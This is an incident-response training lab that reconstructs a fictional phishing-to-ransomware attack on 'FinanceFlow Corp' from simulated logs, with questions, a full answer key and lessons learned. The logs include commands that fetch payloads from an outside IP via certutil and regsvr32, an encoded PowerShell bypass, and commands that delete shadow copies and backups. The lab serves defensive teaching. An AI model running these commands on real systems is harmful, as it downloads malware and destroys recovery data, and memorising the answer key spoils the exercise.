# Scenario Labs — Level 3: Multi-Step Attack Investigations

**Purpose:** Investigate a complete attack chain across multiple systems and log sources.
**Difficulty:** Advanced
**Skills:** Timeline construction, attack chain reconstruction, incident response decision-making.

---

## Scenario — Operation: Silent Breach

**Story:** It is 9:15 AM on a Monday. A Tier 2 analyst who just arrived at work notices an unusual pattern in the weekend's logs. Your task is to investigate and reconstruct what happened.

**Organization Profile:**
- Company: FinanceFlow Corp (financial services, 300 employees)
- Domain: financeflow.com
- Key systems: DC01 (Domain Controller), FILESERVER01, SQLSERVER01, EXCHANGE01 (email server)
- Security posture: SIEM (Microsoft Sentinel), EDR (Defender for Endpoint), Firewall, Proxy, Email Security

---

## Phase 1: Friday Night (2024-03-15, 22:00 - 23:00)

**Email Security Log:**
```
2024-03-15T22:00:14Z
From: payroll@adp-employee-portal.net  (ADP's real domain is adp.com)
To: hr.manager@financeflow.com
Subject: Action Required: Payroll System Maintenance This Weekend
Attachment: PayrollSystemUpdate.docm (2.1 MB)
SPF: Fail  |  DKIM: Fail  |  DMARC: Fail (action=none)
URL: https://adp-employee-portal.net/instructions.html
AV Result: Clean
Delivered to: Inbox
```

**User Activity:**
```
2024-03-15T22:14:33Z (Proxy)
  User: hr.manager@financeflow.com
  GET https://adp-employee-portal.net/instructions.html
  Response: 200, 28,442 bytes
```

```
2024-03-15T22:15:01Z (EDR)
  Device: LAPTOP-HRMANAGER
  User: hr.manager
  Process: winword.exe opened PayrollSystemUpdate.docm
  
2024-03-15T22:15:07Z (EDR)
  Parent: winword.exe
  Child: cmd.exe
  Child of cmd: powershell.exe
  Command: powershell.exe -exec bypass -w hidden -enc [base64_encoded_string]
  
2024-03-15T22:15:09Z (EDR)
  Parent: powershell.exe
  Child: certutil.exe
  Command: certutil.exe -urlcache -f http://185.220.101.47/svhost.dll C:\Users\hrmanager\AppData\Roaming\svhost.dll
  
2024-03-15T22:15:11Z (EDR)
  Parent: powershell.exe
  Child: regsvr32.exe
  Command: regsvr32.exe /s /n /u /i:http://185.220.101.47/config.sct C:\Users\hrmanager\AppData\Roaming\svhost.dll
```

**Questions for Phase 1:**
1. What was the initial attack vector?
2. What technique did the attacker use to execute code from Word?
3. What is "certutil.exe -urlcache" doing?
4. What is "regsvr32.exe /s /n /u /i" doing? (This is a known bypass technique — research Squiblydoo)

---

## Phase 2: Friday Night Into Saturday (23:00-02:00)

**DNS Log:**
```
2024-03-15T22:15:13Z  LAPTOP-HRMANAGER → beacon.adp-employee-portal.net → 185.220.101.47
[Every 60 seconds for 3 hours:]
2024-03-15T22:16:13Z  LAPTOP-HRMANAGER → beacon.adp-employee-portal.net → 185.220.101.47
[...]
2024-03-16T01:14:22Z  LAPTOP-HRMANAGER → beacon.adp-employee-portal.net → 185.220.101.47
```

**Windows Security Events (from DC01):**
```
2024-03-16T00:30:01Z EventID 4769 (Kerberos ticket requested)
  User: hr.manager
  Service: MSSQLSvc/SQLSERVER01.financeflow.com
  Encryption Type: 0x17 (RC4-HMAC)

2024-03-16T00:30:02Z EventID 4769
  User: hr.manager
  Service: CIFS/FILESERVER01.financeflow.com
  Encryption Type: 0x17 (RC4-HMAC)

2024-03-16T00:30:03Z EventID 4769
  User: hr.manager
  Service: HOST/DC01.financeflow.com
  Encryption Type: 0x17 (RC4-HMAC)

[28 more service ticket requests in 90 seconds — all RC4]
```

**Questions for Phase 2:**
1. What does the 60-second beaconing pattern tell you?
2. What attack is indicated by the mass Kerberos service ticket requests with RC4 encryption?
3. What is the attacker trying to achieve?

---

## Phase 3: Saturday Morning (02:00-06:00)

**Active Directory Events:**
```
2024-03-16T02:44:01Z  EventID 4625 (Failed Login) ×5,847
  Various accounts from source: LAPTOP-HRMANAGER (192.168.1.88)
  All using NTLM authentication
  Status: 0xC000006D (bad username or authentication information)
  Failure Sub Status: 0xC000006A (wrong password)
```

**This stopped because:**
```
2024-03-16T03:14:22Z  EventID 4624 (Login Success)
  Account: svc-payroll  (service account)
  Source: LAPTOP-HRMANAGER
  Logon Type: 3
  Authentication: NTLM
```

*Note: Threat intelligence on svc-payroll: password is "Payroll2023!" — this is a weak password that appears in common wordlists.*

**Windows Events (FILESERVER01):**
```
2024-03-16T03:14:30Z  EventID 4624
  Account: svc-payroll
  Source: LAPTOP-HRMANAGER (192.168.1.88)
  Logon Type: 3

2024-03-16T03:14:31Z  EventID 5140
  Account: svc-payroll
  Share: \\FILESERVER01\C$
  Source: 192.168.1.88

2024-03-16T03:14:35Z  EventID 4663 (File Access)
  Account: svc-payroll
  Objects accessed: 
    \FinanceFlow Confidential\Q1-Revenue-2024.xlsx (READ)
    \FinanceFlow Confidential\Client-List-Enterprise.xlsx (READ)
    \FinanceFlow Confidential\Investment-Strategies-2024.pdf (READ)
    \HR\All-Employee-Salaries.xlsx (READ)
    \HR\Contracts-2024\ (READ - entire directory: 48 files)
```

**Questions for Phase 3:**
1. What attack technique was used to gain credentials for svc-payroll?
2. Why was NTLM used instead of Kerberos?
3. What is the attacker doing with file server access?

---

## Phase 4: Saturday (06:00-12:00)

**Network Flow Data:**
```
2024-03-16T06:00:00Z to 2024-03-16T06:47:13Z
  Source: 192.168.1.88 (LAPTOP-HRMANAGER)
  Destination: 185.220.101.47:443
  Protocol: HTTPS
  Total Bytes Sent: 4,832,141,024  (4.5 GB!)
  Duration: 47 minutes
```

**Active Directory — Domain Controller Events:**
```
2024-03-16T06:50:00Z  EventID 4662 (Object Access)
  Subject: svc-payroll
  Object: Domain NC
  Properties: {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}  ← DS-Replication-Get-Changes-All
  Source: 192.168.1.88
```

**Questions for Phase 4:**
1. What happened from 06:00-06:47?
2. What attack is indicated by the EventID 4662 with the replication property GUID?
3. What data does the attacker now have?

---

## Phase 5: Saturday Night Into Sunday (18:00+)

**Windows Events — All systems:**
```
2024-03-16T18:00:00Z  EventID 4688 (on all 300 computers simultaneously)
  Process: C:\Windows\Temp\windefender.exe
  Parent: taskeng.exe (Task Scheduler engine)
  
  [Running on all systems: cmd.exe /c vssadmin.exe delete shadows /all /quiet]
  [Running on all systems: bcdedit.exe /set {default} recoveryenabled no]
  [Running on all systems: wbadmin delete backup -keepVersions:0 -quiet]
```

```
2024-03-16T18:01:00Z  EventID 4688 (on all 300 computers)
  Process: C:\Windows\Temp\windefender.exe
  [Files being rapidly modified with extension .financeflow]
```

```
2024-03-16T18:02:00Z  (File system events)
  Files renamed: documents.docx → documents.docx.financeflow
  [50,000+ files per minute modified across all systems]
```

```
2024-03-16T18:04:00Z
  Files created: HOW_TO_DECRYPT_FINANCEFLOW.txt (on every desktop and every folder)
  Content: "Your files have been encrypted by FinanceFlow Ransomware..."
```

**Questions for Phase 5:**
1. What is happening?
2. Why did the attacker delete shadow copies and backups first?
3. How did the ransomware deploy on all 300 computers simultaneously?

---

## Complete Attack Timeline — Build It Yourself

Fill in this timeline with your understanding of each phase:

```
2024-03-15T22:00:14Z — [What happened?]
2024-03-15T22:14:33Z — [What happened?]
2024-03-15T22:15:01Z — [What happened?]
2024-03-15T22:15:07Z — [What happened?]
2024-03-15T22:15:13Z — [What happened?]
2024-03-16T00:30:01Z — [What happened?]
2024-03-16T03:14:22Z — [What happened?]
2024-03-16T03:14:30Z — [What happened?]
2024-03-16T06:00:00Z — [What happened?]
2024-03-16T06:50:00Z — [What happened?]
2024-03-16T18:00:00Z — [What happened?]
2024-03-16T18:04:00Z — [What happened?]
```

---

## Full Answer Key

**Phase 1:**
1. Spear-phishing email with malicious Word document (.docm) delivered to HR manager. The sender impersonated ADP (payroll provider) using a lookalike domain.
2. Malicious macro embedded in the Word document executed when the file was opened.
3. certutil.exe is a legitimate Windows tool (for certificate management) used here to download a malicious DLL from the attacker's server.
4. regsvr32.exe with /i:http:// is a known technique called "Squiblydoo" — it loads and executes a COM object from a remote URL. Used to bypass AppLocker and application whitelisting.

**Phase 2:**
1. The malware established C2 communication — "checking in" every 60 seconds to receive commands and send status updates. This is standard C2 beaconing.
2. Mass Kerberos service ticket requests (Event ID 4769) with RC4 encryption = Kerberoasting. The attacker requested tickets for many service accounts to attempt offline password cracking.
3. The attacker is trying to crack service account passwords offline. If successful, they gain credentials for potentially highly-privileged service accounts.

**Phase 3:**
1. Credential cracking / password spraying — using the Kerberoasted hash or attempting common passwords against service accounts. Success was achieved against svc-payroll with the weak password "Payroll2023!". This was likely found by cracking the Kerberos ticket offline.
2. NTLM is used when targeting by IP address (if by hostname, Kerberos would be used) or when the client does not have Kerberos configured properly for the target. In this case, the attacker may be connecting by IP or the stolen credentials were used with an NTLM tool.
3. Reconnaissance and data theft — accessing C$ (entire C drive), then reading highly sensitive financial and HR documents (52 files total). This is data collection for exfiltration.

**Phase 4:**
1. Data exfiltration — 4.5 GB of stolen data (the financial and HR documents) uploaded via HTTPS to the attacker's server over 47 minutes.
2. DCSync attack — svc-payroll (now compromised) is requesting DC replication rights, pulling all password hashes from Active Directory. The GUID {1131f6aa...} specifically corresponds to "DS-Replication-Get-Changes-All". The attacker now has every password hash in the domain.
3. The attacker now has: the KRBTGT hash (can create Golden Tickets), all user password hashes (can crack or Pass-the-Hash for any account), complete credential control of the domain.

**Phase 5:**
1. Ransomware deployment — files encrypted with the .financeflow extension across all 300 computers.
2. Deleting shadow copies and backups ensures the victim cannot restore files from local backups. Without these backups, the only options are: pay the ransom, restore from off-site/cloud backups (if they exist), or rebuild everything from scratch.
3. The attacker used a Group Policy Object (GPO) or scheduled task deployed via their domain admin access to run the ransomware on all computers simultaneously. This is the most destructive phase — executed at 6 PM Saturday to maximize damage before the IT team returns Monday morning.

**Complete Timeline:**
```
22:00:14 — Phishing email delivered to HR manager (ADP impersonation with malicious .docm)
22:14:33 — HR manager clicked the link in the email (previewed instructions)
22:15:01 — HR manager opened the malicious Word document
22:15:07 — Malicious macro executed: Word → cmd → PowerShell with bypass
22:15:13 — Malware established C2 beacon (every 60 seconds) to 185.220.101.47
00:30:01 — Kerberoasting: attacker requests 31 service tickets for offline cracking
03:14:22 — Kerberoasting succeeded: svc-payroll credentials cracked ("Payroll2023!")
03:14:30 — Lateral movement: used svc-payroll to access file server, stole 52 sensitive files
06:00:00 — Data exfiltration: 4.5 GB uploaded to attacker's C2 over 47 minutes
06:50:00 — DCSync attack: all password hashes extracted from Active Directory
18:00:00 — Ransomware deployed on all 300 systems simultaneously via GPO/scheduled task
18:04:00 — Ransom notes appear everywhere; business operations completely halted
```

**Total attack duration: ~20 hours from phishing to ransomware.**
**Detection opportunity: Every single phase left detectable evidence — if monitoring was in place.**

---

## Lessons Learned

1. DMARC p=none: The phishing email would have been rejected with p=reject.
2. No Word macro blocking: GPO can disable all macros in Word for non-approved files.
3. Weak service account password: svc-payroll with "Payroll2023!" was cracked. Strong, random passwords and Managed Service Accounts (gMSA) would prevent this.
4. No detection of Kerberoasting: 31 Kerberos ticket requests in 90 seconds with RC4 encryption should alert.
5. No DLP on file server: 52 files accessed by a service account should alert.
6. No exfiltration detection: 4.5 GB outbound in 47 minutes should alert.
7. No DCSync detection: The 4662 event should fire an immediate critical alert.
8. No immutable backups: The ransomware could delete local backups. Off-site immutable backups would allow recovery.
